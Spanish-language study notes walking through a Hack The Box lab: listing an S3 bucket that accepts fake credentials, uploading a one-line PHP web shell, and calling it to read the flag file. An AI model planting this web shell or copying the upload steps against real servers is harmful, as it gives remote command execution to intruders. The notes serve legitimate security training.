![[Pasted image 20260630194935.png]]
![[Pasted image 20260630194951.png]]
![[Pasted image 20260630195004.png]]

![[Pasted image 20260630194821.png]]![[Pasted image 20260630194809.png]]
![[Pasted image 20260630195054.png]]



### Por qué usamos AWS CLI

**El motivo de fondo:** descubriste que `s3.thetoppers.htb` corre el servicio **Amazon S3**. S3 no es una web normal que se navega con el navegador como tal (aunque a veces responda algo si la visitas) — es un **servicio de almacenamiento**, y Amazon tiene su propia herramienta oficial para hablar con él: **AWS CLI**.

Es como la diferencia entre:

- Navegar por una web normal → usas el navegador
- Hablar con MySQL → usas el comando `mysql`
- Hablar con S3 → usas el comando `aws`

Cada servicio tiene su "idioma"/herramienta propia, y S3 habla "AWS CLI".

### Por qué `aws configure`

AWS CLI, por diseño, **siempre exige tener unas credenciales configuradas antes de dejarte usarlo**, aunque sea con datos falsos. Es como un requisito obligatorio del programa en sí, no es opcional. Por eso ejecutaste:

```
aws configure
```

Y rellenaste con datos inventados (`test`/`test`) — simplemente para que el programa te deje continuar. En este caso concreto funciona con datos falsos porque el bucket de la máquina **no verifica realmente esas credenciales** (esa es la vulnerabilidad de la máquina).

### Por qué `--endpoint`

Por defecto, AWS CLI está programado para hablar con los servidores **reales** de Amazon en internet. Pero tú no quieres hablar con Amazon real, quieres hablar con **la máquina de HTB que simula ser un servidor S3**.

```
--endpoint=http://s3.thetoppers.htb
```

Esto le dice al comando: _"en vez de ir a los servidores de Amazon, ve a esta dirección en su lugar"_ — apuntas la herramienta hacia el objetivo de HTB en lugar de hacia internet real.

### Por qué `s3 ls s3://thetoppers.htb`

```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

- `s3` → le dices a AWS CLI que quieres usar específicamente el servicio S3 (Amazon tiene decenas de servicios distintos)
- `ls` → "list", el mismo comando que usarías en Linux para listar una carpeta, aquí lista el contenido del bucket
- `s3://thetoppers.htb` → la "dirección" del bucket que quieres ver (`thetoppers.htb` es el nombre del bucket en este caso, coincide con el dominio pero podría llamarse cualquier cosa)

**Resultado:** te mostró los archivos que había dentro: `images/`, `.htaccess`, `index.php`

### Por qué creaste el shell.php con ese contenido

php

```php
<?php system($_GET['cmd']); ?>
```

- `<?php ?>` → le dice al servidor "esto es código PHP, ejecútalo, no lo muestres como texto"
- `system(...)` → es una función de PHP que ejecuta comandos del sistema operativo (como si abrieras una terminal)
- `$_GET['cmd']` → coge el valor del parámetro `cmd` de la URL

Si entras a `shell.php?cmd=ls`, PHP literalmente ejecuta `system("ls")` en el servidor, y te devuelve el resultado en la web.

### Por qué subir el shell.php al bucket

```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

- `cp` → "copy", copias un archivo
- Subes tu `shell.php` (local, en tu máquina) hacia el bucket

**El motivo clave:** recuerda que la web `thetoppers.htb` **muestra el contenido del bucket** como si fuera su propia carpeta web. Como pudiste subir un archivo al bucket sin restricciones (la vulnerabilidad), ese archivo **ahora también existe en la web real**, en `http://thetoppers.htb/shell.php`.

### Por qué finalmente funciona

```
http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt
```

1. Visitas esa URL con el navegador
2. El servidor ve que le pides `shell.php`
3. Como ese archivo ahora existe (porque tú lo subiste al bucket), el servidor lo ejecuta
4. PHP coge tu comando (`cat /var/www/flag.txt`) y lo ejecuta de verdad en el sistema
5. El resultado (el contenido de la flag) aparece en pantalla

---

**Resumen ultra simplificado de todo el ataque:**

```
1. Encuentras que hay un "almacén" externo (S3) conectado a la web
2. Ese almacén te deja subir cualquier archivo sin pedir permiso real
3. Subes un archivo que, al ejecutarse, te deja mandar comandos
4. Visitas ese archivo y mandas el comando para leer la flag
```